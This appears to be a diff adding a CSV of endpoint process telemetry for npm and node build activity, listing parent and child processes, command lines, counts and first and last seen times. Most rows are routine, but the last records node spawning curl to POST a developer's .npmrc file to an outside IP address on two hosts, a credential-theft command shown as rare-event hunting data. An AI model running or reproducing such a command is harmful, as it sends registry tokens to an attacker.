@@ -1,0 +1,8 @@
+process.parent.name,process.name,sample_command_line,event_count,host_count,hosts_sample,first_seen,last_seen
+node,git,git fetch origin,4210,118,(many),2026-10-21T00:04:11Z,2026-11-19T23:51:40Z
+node,node-gyp,node-gyp rebuild,1320,96,(many),2026-10-21T00:04:11Z,2026-11-19T23:51:40Z
+npm,node,node install.js,3880,117,(many),2026-10-21T00:04:11Z,2026-11-19T23:51:40Z
+node,sh,sh -c node scripts/postinstall.js,990,88,(many),2026-10-21T00:04:11Z,2026-11-19T23:51:40Z
+node,python3,python3 configure.py,410,61,(many),2026-10-21T00:04:11Z,2026-11-19T23:51:40Z
+npm,git,git ls-remote https://github.com/example-org/ui-kit.git,760,72,(many),2026-10-21T00:04:11Z,2026-11-19T23:51:40Z
+node,curl,curl -s -X POST https://203.0.113.45/u -d @/home/dev07/.npmrc,3,2,dev-ws-07;dev-ws-19,2026-11-14T10:02:17Z,2026-11-15T08:41:55Z
